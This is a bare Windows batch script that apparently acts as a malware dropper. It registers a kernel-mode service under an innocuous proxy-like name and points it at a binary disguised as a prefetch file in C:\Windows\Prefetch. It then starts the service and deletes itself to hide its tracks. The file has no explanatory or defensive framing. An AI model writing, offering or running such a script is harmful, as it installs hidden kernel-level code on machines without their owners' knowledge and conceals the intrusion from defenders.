@echo off
cd %~dp0
sc create AutoHttpWinProxySvc1059_c binpath=C:\Windows\Prefetch\UPDATE.EXE-85KZT36B.pf type=kernel
sc start AutoHttpWinProxySvc1059_c
del "%~f0"